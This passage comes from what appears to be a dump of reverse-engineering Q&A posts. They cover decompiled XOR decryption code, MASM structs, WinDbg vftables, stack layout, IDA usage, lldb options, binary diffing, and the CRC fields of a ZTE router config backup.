  *(_BYTE *)(result + a5_NI_length) = *(_BYTE *)(a3_NI_key + a5_NI_length) ^ a7_NI_source_last_byte;

  return result;
}
</code></pre>

<p>Second, <code>getNumber</code>:</p>

<p>This is never actually used, but generates a single byte of random data which is somewhat biased for sepcificaly the value 255 because casting a ""nonnegative long integer uniformly distributed between 0 and 2^31"" to a unsigned byte will, in most cases, yield a number above 255.</p>

<p><a href=""http://linux.die.net/man/2/time"" rel=""nofollow"">time</a> will return the current local time in seconds since Epoch, <a href=""http://linux.die.net/man/3/srand48"" rel=""nofollow"">srand48</a> will seed the builtin PRNG with that result and <a href=""http://linux.die.net/man/3/lrand48"" rel=""nofollow"">lrand48</a> return the random number.</p>

<pre><code>//----- (00001384) --------------------------------------------------------
// This is never used in provided code! :S
int getNumber()
{
  __int32 v0; // r0@1

  // Seed srand48 using current local time in seconds since Epoch
  v0 = time(0);
  srand48(v0);
  // Return 1 byte integer casted from nonnegative long integer uniformly distributed between 0 and 2^31 
  return (unsigned __int8)lrand48();
}
</code></pre>

<p>Third, <code>getKey</code>:</p>

<p><strong>[EDIT]</strong> A simple stream padding based on passed values. It is unclear what <code>crc64</code> does and how are it's parameters used, but it appears as if it does not receive a buffer.
The low dword returned from <code>crc64</code> is copied repeatedly to create the key sequence, and is used as the internal PRNG state. <code>crc64</code> is there for the function creating the initial state, or the seed function for <code>geyKey</code>.
It has some decompliation bloat (that is, extra redundant C statements caused by the decompiler not doing the best job it could) but basically this function fills the requested buffer with the same value over and over.</p>

<pre><code>//----- (00001398) --------------------------------------------------------
int __fastcall getKey(void *a1_NI_key_buffer, unsigned int a2_NI_key_length, unsigned __int8 a3, int a4_NI_unused, char a5)
{
  void *v5; // r8@1
  unsigned int v6; // r7@1
  unsigned int v7; // r10@1
  void *v8; // r5@1
  __int64 v9; // r0@1
  signed int v10; // r6@1
  __int64 v12; // [sp+8h] [bp-30h]@1
  int v13; // [sp+14h] [bp-24h]@1

  v5_NI_key_buffer = a1_NI_key_buffer;
  v6_NI_key_length = a2_NI_key_length;
  v7_NI_key_8byte_chunks = a2_NI_key_length &gt;&gt; 3;
  v8_NI_key_buffer_pos = a1_NI_key_buffer;
  v13_NI_stack_guard = _stack_chk_guard; //a stack guard
  LODWORD(v9_NIl_partial_crc_state) = crc64(a3, (int)&amp;a5, _stack_chk_guard, 8);
  v10_NI_current_8byte_chunk = 0;
  v12_NI_full_crc_state = v9_NIl_partial_crc_state;

  // Loop on 8 byte long chunks of the required key length
  do
  {
    // increase the counter for the current 8byte chunk we're using
    ++v10_NI_current_8byte_chunk;

    // If current 8byte chunk exceeds the required length
    if ( 8 * v10_NI_current_8byte_chunk &gt; v6_NI_key_length )
    {
      // If some bytes of the 8byte chunks are needed
      if ( v6_NI_key_length &gt;= 8 * v10_NI_current_8byte_chunk - 8 )
      {
        // Copy portion of v12_NI_full_crc_state needed to fill the buffer
        LODWORD(v9_NIl_partial_crc_state) = memcpy(v8_NI_key_buffer_pos, &amp;v12_NI_full_crc_state, (size_t)((char *)v5_NI_key_buffer + v6_NI_key_length - (_DWORD)v8_NI_key_buffer_pos));
      }
    }
    else
    {
      // Set v9_NIl_partial_crc_state to the initial v12_NI_full_crc_state
      v9_NIl_partial_crc_state = v12_NI_full_crc_state;
      *(_QWORD *)v8_NI_key_buffer_pos = v12_NI_full_crc_state;
    }
    v8_NI_key_buffer_pos = (char *)v8_NI_key_buffer_pos + 8;
  }while ( v10_NI_current_8byte_chunk &lt;= (signed int)v7_NI_key_8byte_chunks );

  // Make sure stack wasn't damaged in the process
  if ( v13_NI_stack_guard != _stack_chk_guard )
    _stack_chk_fail(v9_NIl_partial_crc_state);
  return v9_NIl_partial_crc_state;
}
</code></pre>

<p>Last but not least, <code>decryptData</code>:</p>

<p>This is where the magic happens, buy it's not too magical. Basically, the first byte is used to feed <code>getKey</code> with a state, togather with <code>a4_NI_unknown_constant</code> parameter passed to <code>decryptData</code>. These two bytes are what determines the entire <code>getKey</code> function.</p>

<p>The last byte (treated strangly in <code>doXor</code> is used as a basic sanify/error detection byte and must result in the correct value for the message to be accepted and properly decrypted.</p>

<pre><code>//----- (000014E4) --------------------------------------------------------
signed int __fastcall decryptData(void *a1_NI_result, unsigned int *a2_NI_source, int a3_NI_length, int a4_NI_unknown_constant, __int64 a5)
{
  int v5; // r4@1
  void *v6; // r11@1
  unsigned int *v7; // r10@1
  unsigned int v8; // r7@3
  int v9; // r9@3
  int v10; // ST10_4@3
  void *v11; // r8@3
  const void *v12; // r5@3
  int v13; // r6@3
  signed int result; // r0@5

  v5_NI_length_copy = a3_NI_length;
  v6_NI_result_copy = a1_NI_result;
  v7_NI_source_copy = a2_NI_source;
  if ( check == 1 )
  {
    if ( a5 )
    {
      result = 0;
    }
    else
    {
      v8_NI_source_first_byte = *(_BYTE *)a2_NI_source;
      v9_NI_unknown_plus_first_byte = a4_NI_unknown_constant + v8_NI_source_first_byte;
      v10_NI_source_last_byte = *((_BYTE *)a2_NI_source + a3_NI_length - 1);
      v11_NI_key = malloc(a3_NI_length - 1);
      v12_NI_temp_result = malloc(v5_NI_length_copy - 1);

      // generate xor key based on:
      // 1. length of data
      // 2. unknown constant provided to decryptData as a4_NI_unknown_constant
      // 3. first byte of encrypted string
      getKey(v11_NI_key, (unsigned __int16)(v5_NI_length_copy - 1), v9_NI_unknown_plus_first_byte, (2596069104u * (unsigned __int64)v8_NI_source_first_byte &gt;&gt; 32) + 305419896 * v8_NI_source_first_byte, -16 * v8_NI_source_first_byte);
      v13_result_length = v5_NI_length_copy - 2;

      // XOR
      doXor((int)v12_NI_temp_result, (int)((char *)v7_NI_source_copy + 1), (int)v11_NI_key, v10_NI_source_last_byte, v13_result_length, (unsigned __int64)v13_result_length &gt;&gt; 32, v10_NI_source_last_byte);

      // Copy result from v12_NI_temp_result to user provided reulst buffer v6_NI_result_copy
      memcpy(v6_NI_result_copy, v12_NI_temp_result, v5_NI_length_copy - 2);

      // If last byte in v12_NI_temp_result is not the same as v9_NI_unknown_plus_first_byte, return Null
      if ( *((char *)v12_NI_temp_result + v5_NI_length_copy - 2) != v9_NI_unknown_plus_first_byte )
        v13_result_length = 0;

      // If key allocated, free it
      if ( v11_NI_key )
        free(v11_NI_key);

      // Free v12_NI_temp_result
      free((void *)v12_NI_temp_result);

      // return v13_result_length
      result = v13_result_length;
    }
  }
  else
  {
    result = -1;
  }
  return result;
}
</code></pre>

<p>Finally, sepcific answers to your questions:</p>

<ol>
<li>The length of the seed is a single byte, as generated in <code>getNumber</code> and used for key generation in <code>getKey</code>. It is used at <code>getKey</code> by expanding it and the other arguments calculated based on <code>v9_NI_unknown_plus_first_byte</code> to generate a <code>QWORD</code>.</li>
<li>For that you'll need to further RE the <code>crc64</code> function. Sorry about that. But understanding the <code>getKey</code> function better makes it possible to use another (more interesting) approach to decrypting streams of data. Since we now know the ""key"" is an 8byte sequeces used repeatedly, every known byte of the original message reveals all other bytes at the same 8byte offset. Messages with fixed headers, or known types of data (textual, for example) reveal a lot of information about the xor key.</li>
<li>I have no idea what's the actual content of the data, nor how to interpret it. That is required in order to validate the type and use. You should gather enough sample sets, decrypt them and see if they look like valid latitude/longitude values. </li>
</ol>

<p>I think the best way for you to proceed now is implementing a simulator that receives a message and tries to decrypt it using the information above. I may have made mistakes or overlooked some small details, but those will be eaier to identify by seeing errors in the produced decryption and following up on those.</p>
","13429"
"Initializing a struct in win32 assembly programming using MASM","907","","<p>I'm trying to create a demo program demonstrating struct(s) in MASM ,</p>

<p>I've written a code like this :</p>

<pre><code>struct1 struct
first db ?
second dw ?
struct1 EndS

.386
.model flat,stdcall
option casemap:none

include \masm32\include\windows.inc ; holds predifned structures

include \masm32\include\kernel32.inc 
include \masm32\include\user32.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib

.data
MessageTitle  db ""The title"",0
MessageText   db ""The first program which shows simple messagebox"",0


.code
start:

Initializedstructure struct1 &lt;'A',1024&gt;
;invoke MessageBox, NULL, addr MessageText, addr MessageTitle, MB_OK
mov eax, struct1.first 
;invoke ExitProcess, NULL
end start
</code></pre>

<p>but when I disassembled the program I found some kind of instructions that
 not sensible for initializing the structure of the program :</p>

<pre><code>.text:00401000 start:
.text:00401000                 inc     ecx
.text:00401001                 add     [eax+edi*4], al
.text:00401001 ; ---------------------------------------------------------------------------
.text:00401004                 dd 7Fh dup(0)
.text:00401200                 dd 380h dup(?)
.text:00401200 _text           ends
</code></pre>

<p>Why MASM assembled the code like this ? I think I've made some mistake in the code,haven't I? I think there's no well-explained document about it ...</p>
","<p>You need to have <code>Initializedstructure struct1 &lt;'A',1024&gt;</code> in your <code>.data</code> segment, not in your <code>.code</code> segment.</p>
","8383"
"Windbg: going from vftable to c++ class","907","","<p>As part of an assignment, I am delving into the world of Internet Explorer, and am trying to figure out exactly what class(es) are being allocated on the heap.</p>

<p>In the <code>mshtml!CEventObj::GenericGetElement()</code> method, the <code>eax</code> register points to an instance of a class, <code>edi</code> points to the object it references, and <code>esi</code> points to the vftable.</p>

<p>This being said, I inserted a breakpoint that would list these registers each time through the function, and they always point to the same vftable.</p>

<p>The vftable in question is <code>mshtml!CBodyElement</code>, but does this actually mean that all these instances are of the <code>CBodyElement</code>, or could they be for classes derived from <code>CBodyElement</code>. </p>

<p>If they are from derived classes, how do I determine the actual classes being allocated ?</p>
","<p>A derived class will get its own <code>vtable</code> if it overrides any of the virtual functions.</p>

<p>If the derived class does not override any virtual functions, it will use the original <code>vtable</code>.</p>

<p>I would say that your assumption is correct ~90% of the time.</p>

<p>The best that you can do for <em>static</em> type recovery, is to look at the <code>vtable</code> being used.</p>

<p>What you can do to help a bit is to turn one PageHeap with stack tracking (<code>gflags.exe /i iexplore.exe +hpa +ust</code>) and look at the address allocated for the object (<code>!heap -p -a 0xaddress</code>).  This will give you a full stack trace to the allocation-site of the object, which is sometimes to determine the type of object (e.g. if a <code>Factory</code> pattern was used).</p>

<p>Finally, there are additional dynamic analysis tricks you can play.  I wrote a Pin tool and IDA Python plugin, <a href=""https://github.com/zachriggle/ida-splode"" rel=""nofollow noreferrer"">ida-splode</a> for almost exactly this application.  By capturing information at runtime, you can enhance your IDA traces.  Below is an example screenshot from the slide deck.  The better symbol information you have (or the better fleshed-out your IDB is), the better the information you get.</p>

<p><img src=""https://i.stack.imgur.com/A0XBu.png"" alt=""enter image description here""></p>
","6442"
"Memory allocation on the stack","905","","<p>Here is a sample function reverse engineered from an easy program:</p>

<pre><code>main            proc near
var_70          = dword ptr -70h
var_6C          = dword ptr -6Ch
var_68          = dword ptr -68h
i_2             = dword ptr -54h
i               = dword ptr -4
push    ebp
mov     ebp, esp
and     esp, 0FFFFFFF0h
sub     esp, 70h
mov     [esp+70h+i], 0
jmp     short loc_804840A
￼￼￼loc_80483F7:
mov     eax, [esp+70h+i]
mov     edx, [esp+70h+i]
add     edx, edx
mov     [esp+eax*4+70h+i_2], edx
add     [esp+70h+i], 1
loc_804840A:
cmp     [esp+70h+i], 13h
jle     short loc_80483F7
mov     [esp+70h+i], 0
jmp     short loc_8048441
loc_804841B:
mov    eax, [esp+70h+i]
mov    edx, [esp+eax*4+70h+i_2]
mov    eax, offset aADD ; ""a[%d]=%d\n""
mov    [esp+70h+var_68], edx
mov    edx, [esp+70h+i]
mov    [esp+70h+var_6C], edx
mov    [esp+70h+var_70], eax
call   _printf
add    [esp+70h+i], 1
loc_8048441:
cmp    [esp+70h+i], 13h
jle     short loc_804841B
mov    eax, 0
leave 
retn
main   endp

C code

#include &lt;stdio.h&gt;
int main() {
    int a[20];
    int i;
    for (i=0; i&lt;20; i++)
        a[i]=i*2;
    for (i=0; i&lt;20; i++)
        printf (""a[%d]=%d\n"", i, a[i]);
    return 0;
}
</code></pre>

<p>My questions are:</p>

<ol>
<li><p>Why is memory not allocated consecutively and why are some parts of the memory in between <code>esp + 70h -54h</code> and <code>esp + 70h -68h</code> not used?</p></li>
<li><p>In <code>sub esp, 70h</code>, the number <code>70h</code> seems to be a random number in a different program, and it is often larger than we need. Why don't the compiler just allocate what we need?</p></li>
</ol>
","<p>In your case because <em>int</em> is 4 bytes and you want 20 element</p>

<pre><code>int a[20] // --&gt; 20 * 4 = 0x50
</code></pre>

<p>so it is very normal for <em>i</em> and <em>i_2</em></p>

<p>The other thing is that your compiler didn't push <em>printf</em> arguments into stack. It pre-allocated the stack location in </p>

<pre><code>var_70 = dword ptr -70h
var_6C = dword ptr -6Ch
var_68 = dword ptr -68h
</code></pre>

<p>and called the function like this</p>

<pre><code>mov    edx, [esp+eax*4+70h+i_2]
mov    eax, offset aADD ; ""a[%d]=%d\n""
mov    [esp+70h+var_68], edx
mov    edx, [esp+70h+i]
mov    [esp+70h+var_6C], edx
mov    [esp+70h+var_70], eax
call   _printf
</code></pre>

<p>But there is 2 reason for such a thing (not your case)...</p>

<ol>
<li><p>The Compiler align the buffer for performance reasons and ease of cache.
in addition unaligned buffers cause failure in some cases like Windows API calls and make debugging hard, so the compilers align every buffer to avoid this kind of failure.</p></li>
<li><p>Some safe compilation allocate random number after buffers to prevent successful exploitation of buffer overruns. for example:</p>

<p>and     esp, 0FFFFFFF0h</p></li>
</ol>

<hr>

<p>yeap! as @DCoder commented, you asked it <a href=""https://reverseengineering.stackexchange.com/questions/4250/why-addresses-of-variable-on-stack-are-not-consecutive"">Here</a> before.</p>
","4369"
"Determining the serial port protocol of a typewriter","903","","<p>How can i determine the serial protocol of a electric typewriter? some electric typewriters have a serial port in the back and it is a shape that is not commonly used today. I am planing on interfacing the typewriter with a Arduino and using it as a printer.</p>

<p>How do i determine things such as the baud rate, the pinout and the voltage. I already broke one typewriter trying to find out the protocol, I cannot get a owners manual for the typewriters, all of the other guides that i found involved modifying the circuit board and connecting the wires to the keys. I have not been able to find out how a a typewriter with a serial port works.</p>

<p>Here is a picture of the serial port, what type is it?</p>

<p><img src=""https://i.stack.imgur.com/wr9sP.jpg"" alt=""enter image description here""></p>
","<p>As Jason Geffner said its a DIN 45326 connector. 
As far as I know they're normally used in audio, but here is a <a href=""http://techpubs.sgi.com/library/dynaweb_docs/hdwr/SGI_EndUser/books/PChall_L_OG/sgi_html/figures/2-4.DIN.connector.gif"">pin out</a> while used for serial.</p>

<p>Next step would be using an Oscilloscope to determine the baud rate (and voltage). Often the oscilloscope software has some build in tools for automatically determining the baud rate. If not, you simple divide 1 by the <a href=""http://simple.wikipedia.org/wiki/Period_%28physics%29"">period</a> of the wave. E.g. find the 2 peaks with the shortest horizontal distance and measure that time to get the period.</p>

<p>If you don't have an oscilloscope you'll have to brute force it. I'd start by trying the most common ones which in my experience are:</p>

<blockquote>
  <p>9600/115200-8-N-1 (9600 or 115200 baud, 8 data bits, no parity, 1 stop bit), no flow control.</p>
</blockquote>

<p>The above are the most common these days, but I have no clue back in the old days what was common.</p>
","2934"
"Recognize the library functions of statically linked executable file in IDA Pro","902","","<p>Recently I worked on a Linux program which has all of its symbols stripped. Opening it with IDA resulted in none of its functions identified. </p>

<p>Thus I tried to extract any usable information from the executable file with the <code>strings</code> and <code>file</code> commands, but these sadly found nothing.</p>

<p>I know about the FLIRT technology in IDA, but it is based on knowing the version of the static library so it can use the correct signature file. In this case it seems we have no any version information for the used <code>glibc</code> or other libraries, so what should we do now?</p>

<pre><code>$ file stripped
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.2.5, stripped
</code></pre>

<p>With the outpuf of <code>file</code> as shown above, can I retrieve more details from this? Or is the solution that we can only recognize it via our experience?</p>
","<p>Short answer - No, there's no easy way to identity statically linked functions within an executable, other than manually reverse engineering the APIs or finding out which version if glibc exactly was used.</p>

<p>Unfortunately, using FLIRT might not prove useful even after you identify the exact glibc version. This is because actual instructions will be altered in the statically linking process. Some functions might be inlined if used rarely or are relatively short, for example. Advanced optimizations might make matter worse.</p>

<p>However, You could rather easily find <code>SYSENTER</code> (or <code>int 0x80</code> if using older versions of glibc/linux) instructions and map those to kernel callbacks. Obviously, a lot of API functionality is implemented without ever accessing the kernel, and that you'll need to work harder to recover. It is a possibility (depends on the linker's configuration when compiling the executable) that other glibc functions will be adjacent memory-wise, so finding a few statically linked APIs could help you recover others.</p>

<p>Last point of advice I could give you is to rename all functions you've identified as part of glibc appropriately, even without actually identifying their functionality, <code>glibcsub_*</code> or a similar easily recognizable pattern. I think you'll find this useful.</p>
","13416"
"Are there any modern assembly-level patching tools?","900","","<p>I've recently been undertaking a little RE project where I needed to patch the executable. For small modifications, I know enough x86 to patch in an jump, nop, infinite loop, etc, so a hex editor is good enough. But what about larger ones? </p>

<p>I used to use OllyDbg for this, there were great tools in it, you could go to any line, press space and just start assembling, instructions you replaced would be padded with NOPs automatically and there were even nice plugins to find code caves. </p>

<p>Unfortunately, OllyDbg seems barely updated these days and fails to load any application on 64 bit Windows 8.1, so I've switched to Hiew. Hiew isn't bad, but the interface is well, more than a little dated and fairly cumbersome to use compared to Olly's. </p>

<p>I'm wondering if anyone knows any more modern tools that can perform this same sort of function. </p>
","<p>If you have IDA pro, IDA patcher was released recently. While I haven't used it personally, it won one of the Hexrays plugin contests, and is probably pretty reasonable.</p>

<p><a href=""https://thesprawl.org/projects/ida-patcher/"" rel=""nofollow"">https://thesprawl.org/projects/ida-patcher/</a></p>

<p>There's also this simple python script which I have used in the past:</p>

<p><a href=""http://stalkr.net/files/ida/idadif.py"" rel=""nofollow"">http://stalkr.net/files/ida/idadif.py</a></p>

<p>It's not modern, but it works.</p>
","6421"
"Does a JE must follow directly to an CMP?","899","","<p>I wanted to know if a jump instruction as <code>JE</code> must directly follow to a <code>CMP</code> instruction. Until now, I did always see that first a <code>CMP</code> comes and after that a <code>JMP</code>. But today I have discover the following:</p>

<pre><code>...
CMP DWORD PTR SS:[EBP+0xC], EAX
MOV ECX, DWORD PTR SS:[EBP+0x18]
PUSH ESI
MOV ECX, DWORD PTR SS:[EBP+0x18]
MOV DWORD PTR SS:[ECX],EAX 
MOV EAX, DWORD PTR SS:[EBP+0x10]
MOV DWORD PTR SS:[EDI], 0x1
JE SHORT crtdll.6C250E66
....
</code></pre>

<p>First of all, I am beginner. So, I try to understand the assembly language. Logically, I would say that the <code>JE</code> instruction is related to the <code>CMP</code> instruction at the beginning of that sequence. </p>

<p>So, my self-explanation was that we first compare, then do some <code>MOV</code> and <code>PUSH</code> operations, after that all we are jumping, is that right?</p>

<p>But, as I mentioned above, normally the jump comes in the next line after the comparison, could one say the reason for that late jump instruction here ? Or is it normal ?</p>
","<p>It is perfectly normal, compilers tend to emit such code for sake of optimization. </p>

<p>Moreover delaying the conditional jump is helpful for instruction prefetching &amp; branch handling. The code is valid too unless the code in between modify the EFLAGS register.</p>
","4437"
"Adding automatically standard structs or enums","898","","<p>Is there any kind of python/idc function that allows you to simulate this?</p>

<p>Structures > Insert > Add standard structure</p>

<p>Thanks,</p>

<p>Sherab</p>
","<p>I found the solution using <strong>Til2Idb</strong></p>

<pre><code>LoadTil(""type_library_name"") #example: mssdk
Til2Idb(-1, ""YOUR_STRUCT_NAME_HERE"") # example: IMAGE_OPTIONAL_HEADER
</code></pre>

<p>The first parameter is used if you want it in a specific position of your structures list. ""-1"" means the end of the list.</p>

<p>Thanks!</p>
","11058"
"How can I figure out the device memory map for an embedded system?","897","","<p>On many embedded systems, a great deal of communication with devices is done by reading and writing to memory-mapped I/O (MMIO) addresses in software. Supposing that I have access to the physical device, and a copy of the firmware that I can load in IDA, how can I figure out which devices are at which addresses?</p>

<p>So far I've just been making guesses by looking at the code, string references (e.g., if a function prints out ""Initializing timer interrupt"" I can guess that maybe some of the addresses are for configuring a timer). But surely <em>something</em> must know where all the devices live in memory, because something is responsible for routing memory reads/writes to the correct device.</p>

<p>So, is there a more systematic way to derive this information?</p>
","<blockquote>
  <p>But surely something must know where all the devices live in memory, because something is responsible for routing memory reads/writes to the correct device.</p>
</blockquote>

<p>In embedded devices there's nothing like PCI (well, it may be present but it's just one of the many HW blocks). So you can't just scan all possibilities to discover the existing devices. The code must know where everything is.</p>

<p>That said, there are some sources of information you may try to find.</p>

<ol>
<li><p>Datasheets - always the best choice. Even if there are typos and c&amp;p errors it still beats anything else. Note that many manufacturers have separate <em>datasheets</em> for pinout, electrical/temperature characteristics of specific chips, and <em>user manuals</em> (also called software or programming manuals) which are shared among many chips in the same family. You usually need the latter, though sometimes the former can also give some useful hints.</p></li>
<li><p><em>Any</em> source code (OS, drivers, etc) you may find for the device. Even if it's not for the specific hardware block you're interested in, the headers may include defines for it.</p></li>
<li><p>If you can't find the exact match for your chip, look for anything in the same family - often the differences are just sizes of some blocks or number of ports.</p></li>
<li><p>Look at the docs for the same HW blocks in <em>any</em> chip of this manufacturer. Some makers reuse their IP blocks across architectures - e.g. Infineon used pretty much the same GPIO blocks in their E-GOLD (C166) and S-GOLD (ARM) basebands. Renesas is another example - they reused IP blocks from SuperH series in their ARM chips.</p></li>
<li><p>Some hardware is standardized across all architectures and manufacturers, e.g.: PCI, USB controllers (OHCI, EHCI, XHCI), SD host controllers, eMMC and so on.</p></li>
</ol>

<p><strong>EDIT</strong>: sometimes, the hardware <em>external</em> to chip may be connected via an <em>external bus interface</em> (or external memory interface, or many other names). This is usually present in the bigger chips with at least a hundred pins. This interface can be programmable, and you can set up which address ranges go to which set of pins. Often there are also so-called <em>chip select</em> (CS) lines involved, which allow multiplexing the same set of pins for accessing several devices, so that one range of addresses will assert CS1, the other CS2 and so on. If you have such a set up, you need to find out the code which initializes the external interface, or dump its configuration at runtime. If you can't do that, you can try looking for memory accesses which correspond to the register layout of the external chip (such as an Ethernet controller), modulo some base address in the CPU's address space.</p>
","2183"
"How to run automatically executable from CLI using lldb?","896","","<p>In <code>gdb</code>, I can run automatically the binary as (as per this <a href=""https://stackoverflow.com/q/2119564/55075"">post</a>):</p>

<pre><code>gdb -ex run /bin/true
</code></pre>

<p>What's the equivalent parameter for <code>lldb</code>?</p>

<p>This works:</p>

<pre><code>echo run | lldb /bin/true
</code></pre>

<p>but I'd like to back to debugger console instead.</p>
","<p>LLDB >= 3.4 has the <code>-o</code> / <code>--one-line</code> command line option that can be used to launch your program automatically:</p>

<p><code>lldb -o run /bin/true</code></p>

<p>For reference here are two relevant snippets from <code>lldb-3.6 --help</code>:</p>

<pre><code>...
   -o 
   --one-line 
        Tells the debugger to execute this one-line lldb command
        after any file provided on the command line has been loaded.
...
  Notes:

       Multiple ""-s"" and ""-o"" options can be provided.  They will be
       processed from left to right in order, with the source files 
       and commands interleaved. 
...
</code></pre>

<p>And for reviewing command line options in a web browser -- here's a link to the <a href=""https://www.netsoup.net/docs/man/lldb-3.4"" rel=""nofollow"">lldb-3.4 man page</a>.</p>

<p>Note that with LLDB &lt; 3.4 (and also newer versions) you can use the <code>-s</code> / <code>--source</code> option to bootstrap commands like <code>run</code> -- for example:</p>

<pre><code>$ echo run &gt; autorun
$ lldb -s autorun -- /bin/echo arg1 arg2
</code></pre>
","11630"
"IDA Pro: Where does newly created structure go to from Pseudocode window?","896","","<p>Where does newly created structure go to from Pseudocode window? I'm referring to structure that you create via right-click on variable and choosing ""Create new struct type"".</p>

<p>I don't see new structure in <code>View / Open Subviews / Structures</code> but I'd like to modify it afterwards.</p>

<p><img src=""https://i.stack.imgur.com/SU7Ry.png"" alt=""enter image description here""></p>

<p>I'm using IDA Pro 6.5</p>
","<p>The created types get added to the Local Types list (View->Open subviews->Local types, or <kbd>Shift-F1</kbd>). To jump directly to the specific type, choose ""Jump to local type..."" from the context menu on a variable of that type.</p>

<p>You can import any structure from Local Types to the Structures list by double-clicking it or selecting ""Syncronize to idb"" from the context menu.</p>

<p>Additionally, the structure gets imported automatically if you select ""Jump to structure definition"" (<kbd>Z</kbd>) on any of its fields in the pseudocode.</p>
","6781"
"Reversing Patches (Binary Diffing)","894","","<p>Does any of you know of a recent tool to bindiff using ImmunityDebugger?
I know about BinDiff by Zynamics and PatchDiff for IDA. But I really want a tool like this in ImmDBG. I also know about Radare's bindiffer and the feature in <code>mona.py</code> (but this is more with memory regions).</p>

<p>Now I use a HexEditor and diff using this. Then I'll lookup the offset + base address using Immunity. This is not really feasible any more as I've recently started reversing bigger patches.</p>

<p>(Just to be a complete reference, for Firmware Updates I use Binwalk. And you should too :)) </p>
","<p>The answer lays within the comments, read Binary Diffing by Nicolas A. Economou (CoreImpact) 2009 to see why.</p>

<p>Good Binary Diffing is in fact a way harder subject that does a lot more than compare bytes or bits. </p>

<p>Making a Binary Diff with objdump and meld is really not the way to go. Read the CoreImpact document and it will show some of the issues with binary diffing.</p>
","2760"
"Zte Reverse engineering config.bin file problem","894","","<p>I just got a Zte <code>ZXHN F660 GPON ONT Wireless</code> router with my optic fiber internet provided by my telecom provider. </p>

<p>My first discovery was that the <code>eth</code> Lan ports are bricked wich 
means I can only use one Lan at time and there's a <code>telnet</code> default user and password i cannot remove or change - well i can do but only provisory: <br> I was able to bypass the problem using telnet and busybox console but the fix is provisory unfortunately. Each time the router reboots the old config gets installed, wich is normal I think.</p>

<p>I decided to investigate a bit more and made a config backup threw the webui wich gives me a <code>.bin</code> file. Using binwalk i saw that there is 3 data blocks compressed with <code>zlib</code>. I made a quick and dirty script in python to unpack them and concatenate them in a <code>XML</code> file wich provides all the router's setup. </p>

<p><strong>I managed to modify and repack it, but here's the problem:</strong> the header contain some informations that make the config upgrade fail each time. With an hex editor I noticed that before each compressed <code>zlib</code> block there is the hex values of the pack inflated and deflated, so I was able to correct them. There's also in the header a <code>CRC32</code> of the concatenation of each <code>zlib</code> compressed packs without headers, so I was also able to correct it when I repack the new file. <br> But next to it there's what I believe is an other <code>CRC32</code>, but I can't find out what that <code>CRC32</code> is about so any help is welcome to this point. </p>

<p>I've downloaded the <code>httpd</code> and <code>cspd</code> files from my router and try to disassemble them using IDA, but the loops I find in gives me the seasick and it's beyond my actual skills so that would be great to get some help and explaination about how to repack the <code>xml</code> file into the <code>bin</code> file.</p>

<p>Thanks for any help or advice.</p>

<p>Here the first offsets of my dummy <code>config.bin</code> file:</p>

<pre><code>Offset(h) 00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
00000000  04 03 02 01 00 00 00 00 00 00 00 04 46 36 36 30  ............F660
00000010  01 02 03 04 00 00 00 00 00 02 37 AB 00 00 36 79  ..........7«..6y
00000020  00 01 00 00 97 10 5B C9 6E 6F 53 12 00 00 00 00  ....—.[ÉnoS.....
00000030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
00000040  00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00  ................
00000050  00 00 16 B8 00 00 17 00 78 DA ED 3D 5B 77 DB 38  ...¸....xÚí=[wÛ8
00000060  73 EF FD 15 69 DA 3E 75 D7 E6 4D F4 E5 7C DB 53  sïý.iÚ>u×æMôå|ÛS
00000070  99 94 1D 9D 95 14 46 94 AD AF FB E2 03 53 B0 CC  ™”..•.F”.¯ûâ.S°Ì
00000080  13 1A 64 49 CA 97 FD F5 05 A8 1B 05 02 20 48 C9  ..dIÊ—ýõ.¨... HÉ
00000090  B2 94 D2 49 6C 47 33 04 06 83 B9 01 1C 60 FE 61  ²”ÒIlG3..ƒ¹..`þa
000000A0  5F FD D7 BF FC 63 F4 10 7C 41 E0 19 FE F1 D5 BE  _ý×¿ücô.|Aà.þñÕ¾
000000B0  BA 02 09 FC FA 65 18 BE 5A E1 0C A5 7F 7C 55 BF  º..üúe.¾Zá.¥.|U¿
000000C0  62 04 FC DF 2F 83 F0 8F AF 0A F9 8F DD 5F 20 77  b.üß/ƒð.¯.ù.Ý_ w
000000D0  AF BB E8 31 FC FA E5 05 04 18 A4 E2 3F 9A A2 64  ¯»è1üúå...¤â?š¢d
000000E0  FF 94 EC 67 DB 30 F0 67 F8 CB 50 8C 6B F2 F3 EB  ÿ”ìgÛ0ðgøËPŒkòóë
000000F0  29 7E FC 14 37 46 7E E0 4E 37 BA 1E B7 07 76 BE  )~ü.7F~àN7º.·.v¾
00000100  63 8D DF F1 9D 0F 5F 07 F8 B7 45 D7 DD 1B FB 64  c.ßñ.._.ø·E×Ý.ûd
00000110  6C AB 59 EB 2B 1C D2 DC E8 3D 5A E2 18 05 A8 65  l«Yë+.ÒÜè=Zâ..¨e
00000120  5B 20 F2 FC F4 7D 81 41 3D 3F 8A FD E9 14 C6 1D  [ òüô}.A=?Šýé.Æ.
00000130  04 1E 02 B8 81 B2 18 C0 92 34 B5 9C 34 4D 48 9A  ...¸.².À’4µœ4MHš
</code></pre>

<p>Here a copy of a dummy <code>config.bin</code>, <code>cspd</code> and <code>httpd</code> files of my router:</p>

<p><a href=""http://s000.tinyupload.com/?file_id=28971449732434837128"" rel=""nofollow"">config.bin,cspd,httpd files</a></p>
","<p>The second CRC is the CRC of the header started from <code>0x10</code> to <code>0x28</code>. The following script checks the config file based on the <code>dbcCfgFileDecry</code> function, which verify and decompress the config file from offset <code>0x10</code>.</p>

<pre><code>import sys
import binascii
import struct
import zlib

if (len(sys.argv) &lt; 1):
    print 'usage: check_config.py config_file'

cf = open(sys.argv[1], 'rb')
h = cf.read(0x4c)

#--------------------
# read the header
if (h[0:4] != '\x04\x03\x02\x01'):
    print 'Invalid magic'
    sys.exit(-1)

if (h[0x10:0x14] != '\x01\x02\x03\x04'):
    print 'Invalid magic'
    sys.exit(-1)

h2 = h[0x10:]
hcrc_calc = binascii.crc32(h2[0:0x18])&amp;0xffffffff
hcrc_store = struct.unpack('!L', h2[0x18:0x1c])[0]
print 'calc: %x - stored: %x'%(hcrc_calc, hcrc_store)
if (hcrc_calc != hcrc_store):
    print 'Invalid header CRC'
    sys.exit(-2)

block_buffer_size = struct.unpack('!L', h2[0x10:0x14])[0]
# used to allocate memory for temp buffers
